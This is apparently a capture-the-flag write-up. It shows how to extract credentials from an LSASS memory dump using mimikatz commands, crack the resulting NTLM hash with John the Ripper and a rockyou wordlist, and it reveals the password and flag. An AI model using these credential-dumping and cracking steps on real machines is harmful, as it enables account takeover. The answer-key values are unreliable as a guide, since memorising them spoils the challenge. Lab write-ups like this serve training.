# Dear LSASS
#### Mimikatz, johntheripper, brute-force
## Challenge Description:

An IT company hired you to perform an internal takeover of the sales department.
While looking around the office, you noticed that an employee named Oshri left his computer unlocked and unsupervised.
﻿Although an attempt to leave a backdoor failed due to the company's endpoint protection software, you managed to successfully dump the memory of the LSASS process to a USB drive

Your goals<br>
☛ Oshri's station is a Windows 10 20H2 (Build 2009).<br>
☛ Extract the credentials from the memory dump of the LSASS process.<br>
☛ Find Oshri's password.<br>

## Process:

Download the DMP file to a virtual Windows 10 and download mimikatz<br>

Open mimikatz with admin privileges<br>
Use the command 'privilege::debug' and make sure you get appropriate response<br>

Use 'sekurlsa::minidump C:\Users\User\Desktop\mimikatz-master\x64\oshri.DMP' to access the DMP file<br>
<img align="center" src="Images/DearLSASS_01.png"><br>

#### sekurIsa:.Iogonpasswords 

<details> 
        <summary>The NTLM hash</summary> 
          722b6a1fc17c46ca1b771f6dd502d7a1
    </details><br>

Create a txt file with the NTLM hash in a kali machine<br>
Use the command 'john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt' to brute-force the hash<br>


<details> 
        <summary>The password we were looking for</summary>
        <img align="center" src="Images/DearLSASS_02.png"><br>
"qweasdqweasd"
    </details><br>
Convert the password through an MD5 converter and you found the hash

<details> 
        <summary>The Hidden Flag</summary> 
          ca64f5c1d65081a0b2a797844b6557f4
    </details><br>

